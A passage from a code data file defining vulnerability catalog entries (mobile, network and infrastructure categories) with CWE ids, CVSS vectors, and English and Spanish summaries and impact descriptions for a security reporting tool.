        cvss: { score: 7.5, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "N", availability: "N" },
        overview_en: "### Summary\nThis category covers all the ways that cryptography can be done wrong in a mobile app. This could be using a weak algorithm, a bad implementation of a strong algorithm, or poor key management.\n\n---\n\n### Impact\nSensitive data protected by weak cryptography can be decrypted by an attacker.",
        overview_es: "### Resumen\nEsta categoría cubre todas las formas en que la criptografía se puede hacer mal en una aplicación móvil. Esto podría ser el uso de un algoritmo débil, una mala implementación de un algoritmo fuerte o una mala gestión de claves.\n\n---\n\n### Impacto\nLos datos sensibles protegidos por una criptografía débil pueden ser descifrados por un atacante.",
        references: ["https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography"],
        tags: ["Mobile", "Cryptography"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-mob-020",
        title_en: "Client-Side Injection",
        title_es: "Inyección en el Lado del Cliente",
        cwe: "CWE-74",
        severity: "Medium",
        cvss: { score: 6.1, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "R", scope: "C", confidentiality: "L", integrity: "L", availability: "N" },
        overview_en: "### Summary\nThis category covers all the ways that an attacker can inject malicious code into the mobile app. This could be through a web view, a local file, or a network resource.\n\n---\n\n### Impact\nAn attacker can execute arbitrary code within the context of the mobile app, potentially stealing data or performing unauthorized actions.",
        overview_es: "### Resumen\nEsta categoría cubre todas las formas en que un atacante puede inyectar código malicioso en la aplicación móvil. Esto podría ser a través de una vista web, un archivo local o un recurso de red.\n\n---\n\n### Impacto\nUn atacante puede ejecutar código arbitrario dentro del contexto de la aplicación móvil, pudiendo robar datos o realizar acciones no autorizadas.",
        references: ["https://owasp.org/www-project-mobile-top-10/2016-risks/m7-client-code-quality"],
        tags: ["Mobile", "Injection"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-mob-021",
        title_en: "Security Misconfiguration",
        title_es: "Configuración Insegura",
        cwe: "CWE-16",
        severity: "Medium",
        cvss: { score: 6.5, vectorString: "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N", attackVector: "L", attackComplexity: "L", privilegesRequired: "L", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "N", availability: "N" },
        overview_en: "### Summary\nThis category covers all the ways that a mobile app can be misconfigured. This could be anything from leaving debugging code in the app to using insecure default settings.\n\n---\n\n### Impact\nMisconfigurations can expose sensitive functionality or data, or make the application easier to reverse engineer and attack.",
        overview_es: "### Resumen\nEsta categoría cubre todas las formas en que una aplicación móvil puede estar mal configurada. Esto podría ser cualquier cosa, desde dejar código de depuración en la aplicación hasta usar configuraciones predeterminadas inseguras.\n\n---\n\n### Impacto\nLas configuraciones incorrectas pueden exponer funcionalidades o datos sensibles, o hacer que la aplicación sea más fácil de aplicar ingeniería inversa y atacar.",
        references: ["https://owasp.org/www-project-mobile-top-10/2016-risks/m1-improper-platform-usage"],
        tags: ["Mobile", "Configuration"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-mob-022",
        title_en: "Reverse Engineering",
        title_es: "Ingeniería Inversa",
        cwe: "CWE-506",
        severity: "Medium",
        cvss: { score: 5.9, vectorString: "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N", attackVector: "L", attackComplexity: "L", privilegesRequired: "N", userInteraction: "R", scope: "U", confidentiality: "H", integrity: "N", availability: "N" },
        overview_en: "### Summary\nAn attacker can reverse engineer the mobile app to understand its inner workings. This can be used to find vulnerabilities, bypass security controls, or steal intellectual property.\n\n---\n\n### Impact\nAn attacker can analyze the application's binary to discover vulnerabilities, extract sensitive information like API keys, or understand business logic to abuse it.",
        overview_es: "### Resumen\nUn atacante puede aplicar ingeniería inversa a la aplicación móvil para comprender su funcionamiento interno. Esto se puede utilizar para encontrar vulnerabilidades, eludir controles de seguridad o robar propiedad intelectual.\n\n---\n\n### Impacto\nUn atacante puede analizar el binario de la aplicación para descubrir vulnerabilidades, extraer información sensible como claves de API o comprender la lógica de negocio para abusar de ella.",
        references: ["https://owasp.org/www-project-mobile-top-10/2016-risks/m9-reverse-engineering"],
        tags: ["Mobile", "Reverse Engineering"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-mob-023",
        title_en: "Extraneous Functionality",
        title_es: "Funcionalidad Oculta",
        cwe: "CWE-1059",
        severity: "Low",
        cvss: { score: 4.3, vectorString: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "L", userInteraction: "N", scope: "U", confidentiality: "L", integrity: "N", availability: "N" },
        overview_en: "### Summary\nOften, developers include hidden functionality or backdoors in the app that is not intended for the end user. This could be for debugging or testing purposes. An attacker can use this functionality to bypass security controls or gain unauthorized access.\n\n---\n\n### Impact\nAn attacker may discover hidden administrative or debugging functionality that could be abused to compromise the application or user data.",
        overview_es: "### Resumen\nA menudo, los desarrolladores incluyen funcionalidades ocultas o puertas traseras en la aplicación que no están destinadas al usuario final. Esto podría ser para fines de depuración o prueba. Un atacante puede usar esta funcionalidad para eludir los controles de seguridad u obtener acceso no autorizado.\n\n---\n\n### Impacto\nUn atacante puede descubrir funcionalidades administrativas o de depuración ocultas que podrían ser abusadas para comprometer la aplicación o los datos del usuario.",
        references: ["https://owasp.org/www-project-mobile-top-10/2016-risks/m10-extraneous-functionality"],
        tags: ["Mobile", "Configuration"],
        ...emptyVulnBoilerplate
    },

    // Network
    {
        id: "vuln-net-024",
        title_en: "Man-in-the-Middle (MitM)",
        title_es: "Ataque de Intermediario (MitM)",
        cwe: "CWE-300",
        severity: "High",
        cvss: { score: 8.1, vectorString: "CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N", attackVector: "A", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "N" },
        overview_en: "### Summary\nAn attacker intercepts communication between two parties. For example, an attacker can intercept the communication between a mobile app and the server. This can be used to steal sensitive information or to modify the communication.\n\n---\n\n### Impact\nAn attacker can read and modify all traffic passing between the client and the server, including credentials, personal information, and any other sensitive data.",
        overview_es: "### Resumen\nUn atacante intercepta la comunicación entre dos partes. Por ejemplo, un atacante puede interceptar la comunicación entre una aplicación móvil y el servidor. Esto se puede utilizar para robar información sensible o para modificar la comunicación.\n\n---\n\n### Impacto\nUn atacante puede leer y modificar todo el tráfico que pasa entre el cliente y el servidor, incluidas las credenciales, la información personal y cualquier otro dato sensible.",
        references: ["https://owasp.org/www-community/attacks/Man-in-the-middle_attack"],
        tags: ["Network"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-net-025",
        title_en: "DNS Spoofing",
        title_es: "Suplantación de DNS",
        cwe: "CWE-345",
        severity: "Medium",
        cvss: { score: 6.8, vectorString: "CVSS:3.1/AV:A/AC:L/PR:N/UI:R/S:U/C:H/I:L/A:N", attackVector: "A", attackComplexity: "L", privilegesRequired: "N", userInteraction: "R", scope: "U", confidentiality: "H", integrity: "L", availability: "N" },
        overview_en: "### Summary\nDNS spoofing is a type of attack where an attacker redirects a user to a malicious website by corrupting the DNS cache. This can be used to steal sensitive information or to distribute malware.\n\n---\n\n### Impact\nUsers can be redirected to malicious phishing sites, which can lead to credential theft or malware infection.",
        overview_es: "### Resumen\nLa suplantación de DNS es un tipo de ataque en el que un atacante redirige a un usuario a un sitio web malicioso corrompiendo la caché de DNS. Esto se puede utilizar para robar información sensible o para distribuir malware.\n\n---\n\n### Impacto\nLos usuarios pueden ser redirigidos a sitios de phishing maliciosos, lo que puede conducir al robo de credenciales o la infección por malware.",
        references: ["https://www.cloudflare.com/learning/dns/dns-cache-poisoning/"],
        tags: ["Network", "Spoofing"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-net-026",
        title_en: "ARP Poisoning",
        title_es: "Envenenamiento ARP",
        cwe: "CWE-345",
        severity: "Medium",
        cvss: { score: 6.5, vectorString: "CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L", attackVector: "A", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "L", integrity: "L", availability: "L" },
        overview_en: "### Summary\nARP poisoning is a type of attack where an attacker sends forged ARP messages onto a local area network. This can be used to intercept traffic, to perform denial of service attacks, or to perform man-in-the-middle attacks.\n\n---\n\n### Impact\nAllows an attacker on the local network to intercept, modify, or stop traffic between other devices.",
        overview_es: "### Resumen\nEl envenenamiento de ARP es un tipo de ataque en el que un atacante envía mensajes ARP falsificados a una red de área local. Esto se puede utilizar para interceptar tráfico, realizar ataques de denegación de servicio o realizar ataques de intermediario.\n\n---\n\n### Impacto\nPermite a un atacante en la red local interceptar, modificar o detener el tráfico entre otros dispositivos.",
        references: ["https://www.veracode.com/security/arp-poisoning"],
        tags: ["Network", "Spoofing"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-net-027",
        title_en: "IP Spoofing",
        title_es: "Suplantación de IP",
        cwe: "CWE-345",
        severity: "Medium",
        cvss: { score: 6.3, vectorString: "CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L", attackVector: "A", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "L", integrity: "L", availability: "L" },
        overview_en: "### Summary\nIP spoofing is a type of attack where an attacker sends IP packets from a false source address. This can be used to bypass security controls, to perform denial of service attacks, or to perform man-in-the-middle attacks.\n\n---\n\n### Impact\nCan be used to bypass IP-based authentication or to hide the identity of an attacker.",
        overview_es: "### Resumen\nLa suplantación de IP es un tipo de ataque en el que un atacante envía paquetes IP desde una dirección de origen falsa. Esto se puede utilizar para eludir los controles de seguridad, realizar ataques de denegación de servicio o realizar ataques de intermediario.\n\n---\n\n### Impacto\nPuede usarse para eludir la autenticación basada en IP o para ocultar la identidad de un atacante.",
        references: ["https://www.imperva.com/learn/ddos/ip-spoofing/"],
        tags: ["Network", "Spoofing"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-net-028",
        title_en: "Denial of Service (DoS)",
        title_es: "Denegación de Servicio (DoS)",
        cwe: "CWE-400",
        severity: "High",
        cvss: { score: 7.5, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "N", integrity: "N", availability: "H" },
        overview_en: "### Summary\nA DoS attack is a type of attack where an attacker attempts to make a machine or network resource unavailable to its intended users. This can be done by flooding the target with traffic, or by sending a request that triggers a crash.\n\n---\n\n### Impact\nLegitimate users are unable to access the service, resulting in business disruption and financial loss.",
        overview_es: "### Resumen\nUn ataque DoS es un tipo de ataque en el que un atacante intenta hacer que una máquina o un recurso de red no esté disponible para sus usuarios previstos. Esto se puede hacer inundando el objetivo con tráfico o enviando una solicitud que provoque un bloqueo.\n\n---\n\n### Impacto\nLos usuarios legítimos no pueden acceder al servicio, lo que resulta en interrupciones del negocio y pérdidas financieras.",
        references: ["https://www.cisco.com/c/en/us/products/security/what-is-a-denial-of-service-attack.html"],
        tags: ["Network"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-net-029",
        title_en: "VLAN Hopping",
        title_es: "Salto entre VLAN",
        cwe: "CWE-266",
        severity: "Medium",
        cvss: { score: 5.8, vectorString: "CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N", attackVector: "A", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "L", integrity: "L", availability: "N" },
        overview_en: "### Summary\nVLAN hopping is a type of attack where an attacker sends packets to a VLAN that they are not a member of. This can be used to bypass security controls or to gain unauthorized access to network resources.\n\n---\n\n### Impact\nAllows an attacker to access network segments and resources that should be isolated, potentially leading to further compromise.",
        overview_es: "### Resumen\nEl salto de VLAN es un tipo de ataque en el que un atacante envía paquetes a una VLAN de la que no es miembro. Esto se puede utilizar para eludir los controles de seguridad u obtener acceso no autorizado a los recursos de la red.\n\n---\n\n### Impacto\nPermite a un atacante acceder a segmentos de red y recursos que deberían estar aislados, lo que podría conducir a un compromiso mayor.",
        references: ["https://www.imperva.com/learn/application-security/vlan-hopping/"],
        tags: ["Network"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-net-030",
        title_en: "Weak Network Encryption",
        title_es: "Cifrado Débil de Red",
        cwe: "CWE-326",
        severity: "High",
        cvss: { score: 7.5, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "N", availability: "N" },
        overview_en: "### Summary\nThis category covers all the ways that network encryption can be done wrong. This could be using a weak algorithm, a bad implementation of a strong algorithm, or poor key management.\n\n---\n\n### Impact\nSensitive data protected by weak cryptography can be decrypted by an attacker.",
        overview_es: "### Resumen\nEsta categoría cubre todas las formas en que el cifrado de red se puede hacer mal. Esto podría ser el uso de un algoritmo débil, una mala implementación de un algoritmo fuerte o una mala gestión de claves.\n\n---\n\n### Impacto\nLos datos sensibles protegidos por una criptografía débil pueden ser descifrados por un atacante.",
        references: ["https://www.acunetix.com/blog/articles/tls-ssl-cipher-hardening/"],
        tags: ["Network", "Cryptography"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-net-031",
        title_en: "Firewall Misconfiguration",
        title_es: "Configuración Incorrecta del Firewall",
        cwe: "CWE-16",
        severity: "Medium",
        cvss: { score: 6.5, vectorString: "CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L", attackVector: "A", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "L", integrity: "L", availability: "L" },
        overview_en: "### Summary\nA firewall misconfiguration can allow an attacker to bypass security controls and gain unauthorized access to network resources.\n\n---\n\n### Impact\nUnnecessary services may be exposed to untrusted networks, increasing the attack surface and risk of compromise.",
        overview_es: "### Resumen\nUna configuración incorrecta del firewall puede permitir que un atacante eluda los controles de seguridad y obtenga acceso no autorizado a los recursos de la red.\n\n---\n\n### Impacto\nSe pueden exponer servicios innecesarios a redes no confiables, lo que aumenta la superficie de ataque y el riesgo de compromiso.",
        references: ["https://www.sans.org/top-new-attacks-and-threats-letter/"],
        tags: ["Network", "Configuration"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-net-032",
        title_en: "Unsecured Wi-Fi",
        title_es: "Wi-Fi no Segura",
        cwe: "CWE-311",
        severity: "Medium",
        cvss: { score: 6.3, vectorString: "CVSS:3.1/AV:A/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:L", attackVector: "A", attackComplexity: "L", privilegesRequired: "N", userInteraction: "R", scope: "U", confidentiality: "L", integrity: "L", availability: "L" },
        overview_en: "### Summary\nAn unsecured Wi-Fi network can allow an attacker to intercept traffic, to perform denial of service attacks, or to perform man-in-the-middle attacks.\n\n---\n\n### Impact\nAn attacker can eavesdrop on all wireless traffic, potentially capturing sensitive information or injecting malicious data into sessions.",
        overview_es: "### Resumen\nUna red Wi-Fi no segura puede permitir que un atacante intercepte tráfico, realice ataques de denegación de servicio o realice ataques de intermediario.\n\n---\n\n### Impacto\nUn atacante puede espiar todo el tráfico inalámbrico, capturando potencialmente información sensible o inyectando datos maliciosos en las sesiones.",
        references: ["https://www.fcc.gov/consumers/guides/wi-fi-security"],
        tags: ["Network"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-net-033",
        title_en: "Packet Sniffing",
        title_es: "Análisis de Paquetes",
        cwe: "CWE-319",
        severity: "Medium",
        cvss: { score: 5.3, vectorString: "CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N", attackVector: "A", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "L", integrity: "N", availability: "N" },
        overview_en: "### Summary\nPacket sniffing is the act of capturing and inspecting data packets as they travel across a network. This can be used to steal sensitive information or to perform man-in-the-middle attacks.\n\n---\n\n### Impact\nIf traffic is unencrypted, an attacker can capture credentials, session tokens, and other sensitive data.",
        overview_es: "### Resumen\nEl análisis de paquetes es el acto de capturar e inspeccionar paquetes de datos mientras viajan a través de una red. Esto se puede utilizar para robar información sensible o para realizar ataques de intermediario.\n\n---\n\n### Impacto\nSi el tráfico no está cifrado, un atacante puede capturar credenciales, tokens de sesión y otros datos sensibles.",
        references: ["https://www.varonis.com/blog/what-is-packet-sniffing"],
        tags: ["Network"],
        ...emptyVulnBoilerplate
    },

    // Infrastructure
    {
        id: "vuln-inf-034",
        title_en: "Unpatched Software",
        title_es: "Software sin Parches",
        cwe: "CWE-937",
        severity: "Critical",
        cvss: { score: 9.8, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "H" },
        overview_en: "### Summary\nRunning software with known vulnerabilities is one of the most common ways that systems are compromised. This includes operating systems, web servers, databases, and any other software that is running on the system.\n\n---\n\n### Impact\nDepending on the vulnerability, an attacker could gain complete control of the affected system.",
        overview_es: "### Resumen\nEjecutar software con vulnerabilidades conocidas es una de las formas más comunes en que los sistemas se ven comprometidos. Esto incluye sistemas operativos, servidores web, bases de datos y cualquier otro software que se esté ejecutando en el sistema.\n\n---\n\n### Impacto\nDependiendo de la vulnerabilidad, un atacante podría obtener el control completo del sistema afectado.",
        references: ["https://www.cisa.gov/known-exploited-vulnerabilities-catalog"],
        tags: ["Infrastructure"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-inf-035",
        title_en: "Default Credentials",
        title_es: "Credenciales por Defecto",
        cwe: "CWE-1392",
        severity: "High",
        cvss: { score: 8.8, vectorString: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H", attackVector: "N", attackComplexity: "L", privilegesRequired: "L", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "H" },
        overview_en: "### Summary\nMany systems are shipped with default credentials that are well-known to attackers. If these credentials are not changed, an attacker can use them to gain unauthorized access to the system.\n\n---\n\n### Impact\nAn attacker can gain administrative access to the system, leading to a full compromise.",
        overview_es: "### Resumen\nMuchos sistemas se envían con credenciales predeterminadas que son bien conocidas por los atacantes. Si estas credenciales no se cambian, un atacante puede usarlas para obtener acceso no autorizado al sistema.\n\n---\n\n### Impacto\nUn atacante puede obtener acceso administrativo al sistema, lo que lleva a un compromiso total.",
        references: ["https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=default+password"],
        tags: ["Infrastructure", "Authentication"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-inf-036",
        title_en: "Directory Traversal",
        title_es: "Salto de Directorio",
        cwe: "CWE-22",
        severity: "High",
        cvss: { score: 7.5, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "N", availability: "N" },
        overview_en: "### Summary\nDirectory traversal is a type of vulnerability that allows an attacker to read arbitrary files on the server. This can be used to read sensitive files, such as configuration files, source code, or system files like `/etc/passwd`.\n\n---\n\n### Impact\nAn attacker can read sensitive files from the server, which can lead to further compromise.",
        overview_es: "### Resumen\nEl salto de directorio es un tipo de vulnerabilidad que permite a un atacante leer archivos arbitrarios en el servidor. Esto se puede utilizar para leer archivos sensibles, como archivos de configuración, código fuente o archivos de sistema como `/etc/passwd`.\n\n---\n\n### Impacto\nUn atacante puede leer archivos sensibles del servidor, lo que puede conducir a un mayor compromiso.",
        references: ["https://owasp.org/www-community/attacks/Path_Traversal"],
        tags: ["Infrastructure", "Access Control"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-inf-037",
        title_en: "Remote Code Execution (RCE)",
        title_es: "Ejecución Remota de Código (RCE)",
        cwe: "CWE-94",
        severity: "Critical",
        cvss: { score: 9.8, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "H" },
        overview_en: "### Summary\nRemote code execution is a type of vulnerability that allows an attacker to execute arbitrary code on a target machine. This is often the result of another vulnerability, such as a buffer overflow or an injection attack.\n\n---\n\n### Impact\nAn attacker can gain complete control over the affected system.",
        overview_es: "### Resumen\nLa ejecución remota de código es un tipo de vulnerabilidad que permite a un atacante ejecutar código arbitrario en una máquina objetivo. Esto suele ser el resultado de otra vulnerabilidad, como un desbordamiento de búfer o un ataque de inyección.\n\n---\n\n### Impacto\nUn atacante puede obtener el control completo sobre el sistema afectado.",
        references: ["https://www.imperva.com/learn/application-security/remote-code-execution-rce/"],
        tags: ["Infrastructure"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-inf-038",
        title_en: "Privilege Escalation",
        title_es: "Escalada de Privilegios",
        cwe: "CWE-269",
        severity: "High",
        cvss: { score: 8.8, vectorString: "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H", attackVector: "L", attackComplexity: "L", privilegesRequired: "L", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "H" },
        overview_en: "### Summary\nPrivilege escalation is a type of vulnerability that allows an attacker to gain elevated access to resources that are normally protected from an application or user. This can be done by exploiting a bug, design flaw, or configuration oversight in an operating system or software application.\n\n---\n\n### Impact\nAn attacker with low-privilege access can escalate their privileges to administrator or root, gaining complete control of the system.",
        overview_es: "### Resumen\nLa escalada de privilegios es un tipo de vulnerabilidad que permite a un atacante obtener acceso elevado a recursos que normalmente están protegidos de una aplicación o usuario. Esto se puede hacer explotando un error, un defecto de diseño o un descuido de configuración en un sistema operativo o aplicación de software.\n\n---\n\n### Impacto\nUn atacante con acceso de bajos privilegios puede escalar sus privilegios a administrador o root, obteniendo el control completo del sistema.",
        references: ["https://owasp.org/www-community/attacks/Privilege_escalation"],
        tags: ["Infrastructure", "Access Control"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-inf-039",
        title_en: "Information Disclosure",
        title_es: "Divulgación de Información",
        cwe: "CWE-200",
        severity: "Medium",
        cvss: { score: 5.3, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "L", integrity: "N", availability: "N" },
        overview_en: "### Summary\nAn information disclosure vulnerability allows an attacker to gain information about a system that they are not authorized to have. This can include information about the system's configuration, software versions, or even sensitive data like passwords or credit card numbers.\n\n---\n\n### Impact\nInformation disclosure can provide an attacker with the information they need to launch further attacks, or it can directly expose sensitive data.",
        overview_es: "### Resumen\nUna vulnerabilidad de divulgación de información permite a un atacante obtener información sobre un sistema que no está autorizado a tener. Esto puede incluir información sobre la configuración del sistema, las versiones de software o incluso datos sensibles como contraseñas o números de tarjetas de crédito.\n\n---\n\n### Impacto\nLa divulgación de información puede proporcionar a un atacante la información que necesita para lanzar más ataques, o puede exponer directamente datos sensibles.",
        references: ["https://owasp.org/www-community/vulnerabilities/Information_Leakage"],
        tags: ["Infrastructure", "Data"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-inf-040",
        title_en: "Command Injection",
        title_es: "Inyección de Comandos",
        cwe: "CWE-77",
        severity: "High",
        cvss: { score: 8.8, vectorString: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H", attackVector: "N", attackComplexity: "L", privilegesRequired: "L", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "H" },
        overview_en: "### Summary\nCommand injection is a type of vulnerability that allows an attacker to execute arbitrary commands on the host operating system. This is often the result of an application that passes user-supplied input to a system shell.\n\n---\n\n### Impact\nAn attacker can execute arbitrary commands on the host operating system, which can lead to a full system compromise.",
        overview_es: "### Resumen\nLa inyección de comandos es un tipo de vulnerabilidad que permite a un atacante ejecutar comandos arbitrarios en el sistema operativo anfitrión. Esto suele ser el resultado de una aplicación que pasa la entrada proporcionada por el usuario a un shell del sistema.\n\n---\n\n### Impacto\nUn atacante puede ejecutar comandos arbitrarios en el sistema operativo anfitrión, lo que puede llevar a un compromiso total del sistema.",
        references: ["https://owasp.org/www-community/attacks/Command_Injection"],
        tags: ["Infrastructure", "Injection"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-inf-041",
        title_en: "Path Traversal",
        title_es: "Salto de Ruta",
        cwe: "CWE-22",
        severity: "High",
        cvss: { score: 7.5, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "N", availability: "N" },
        overview_en: "### Summary\nPath traversal is a type of vulnerability that allows an attacker to read arbitrary files on the server. This is often the result of an application that uses user-supplied input to construct a file path.\n\n---\n\n### Impact\nAn attacker can read sensitive files from the server, such as configuration files, source code, or system files like `/etc/passwd`.",
        overview_es: "### Resumen\nEl salto de ruta es un tipo de vulnerabilidad que permite a un atacante leer archivos arbitrarios en el servidor. Esto suele ser el resultado de una aplicación que utiliza la entrada proporcionada por el usuario para construir una ruta de archivo.\n\n---\n\n### Impacto\nUn atacante puede leer archivos sensibles del servidor, como archivos de configuración, código fuente o archivos de sistema como `/etc/passwd`.",
        references: ["https://owasp.org/www-community/attacks/Path_Traversal"],
        tags: ["Infrastructure", "Access Control"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-inf-042",
        title_en: "Open Redirects",
        title_es: "Redirecciones Abiertas",
        cwe: "CWE-601",
        severity: "Medium",
        cvss: { score: 5.4, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "R", scope: "C", confidentiality: "L", integrity: "L", availability: "N" },
        overview_en: "### Summary\nAn open redirect is a type of vulnerability that allows an attacker to redirect a user to a malicious website. This is often the result of an application that uses user-supplied input to construct a redirect URL.\n\n---\n\n### Impact\nAn attacker can redirect a user to a malicious website, which can be used to steal sensitive information or to distribute malware. It also makes phishing attacks appear more credible.",
        overview_es: "### Resumen\nUna redirección abierta es un tipo de vulnerabilidad que permite a un atacante redirigir a un usuario a un sitio web malicioso. Esto suele ser el resultado de una aplicación que utiliza la entrada proporcionada por el usuario para construir una URL de redirección.\n\n---\n\n### Impacto\nUn atacante puede redirigir a un usuario a un sitio web malicioso, que se puede utilizar para robar información sensible o para distribuir malware. También hace que los ataques de phishing parezcan más creíbles.",
        references: ["https://owasp.org/www-community/vulnerabilities/Unvalidated_Redirects_and_Forwards_Cheat_Sheet"],
        tags: ["Infrastructure", "Web"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-inf-043",
        title_en: "Insecure File Shares",
        title_es: "Recursos Compartidos de Archivos Inseguros",
        cwe: "CWE-276",
        severity: "High",
        cvss: { score: 7.2, vectorString: "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H", attackVector: "N", attackComplexity: "L", privilegesRequired: "H", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "H" },
        overview_en: "### Summary\nAn insecure file share is a type of vulnerability that allows an attacker to gain unauthorized access to files on a network share. This is often the result of a misconfigured file share that allows anonymous access or has weak permissions.\n\n---\n\n### Impact\nAn attacker can gain unauthorized access to sensitive files, such as configuration files, source code, or system files.",
        overview_es: "### Resumen\nUn recurso compartido de archivos inseguro es un tipo de vulnerabilidad que permite a un atacante obtener acceso no autorizado a los archivos en un recurso compartido de red. Esto suele ser el resultado de un recurso compartido de archivos mal configurado que permite el acceso anónimo o tiene permisos débiles.\n\n---\n\n### Impacto\nUn atacante puede obtener acceso no autorizado a archivos sensibles, como archivos de configuración, código fuente o archivos de sistema.",
        references: ["https://www.acunetix.com/vulnerabilities/web/insecure-file-permissions/"],
        tags: ["Infrastructure", "Configuration"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-inf-044",
        title_en: "Sensitive Data on File Shares",
        title_es: "Datos Sensibles en Recursos Compartidos",
        cwe: "CWE-312",
        severity: "High",
        cvss: { score: 8.8, vectorString: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H", attackVector: "N", attackComplexity: "L", privilegesRequired: "L", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "H" },
        overview_en: "### Summary\nThis category covers all the ways that sensitive data can be exposed on a file share. This could be anything from user credentials to personal information to session data.\n\n---\n\n### Impact\nAn attacker with access to the file share can gain access to sensitive information, such as passwords, API keys, or personal user data.",
        overview_es: "### Resumen\nEsta categoría cubre todas las formas en que los datos sensibles pueden quedar expuestos en un recurso compartido de archivos. Esto podría ser cualquier cosa, desde credenciales de usuario hasta información personal o datos de sesión.\n\n---\n\n### Impacto\nUn atacante con acceso al recurso compartido de archivos puede obtener acceso a información sensible, como contraseñas, claves de API o datos personales del usuario.",
        references: ["https://www.varonis.com/blog/data-security"],
        tags: ["Infrastructure", "Data"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-inf-045",
        title_en: "Unnecessary Exposed Services",
        title_es: "Servicios Expuestos Innecesariamente",
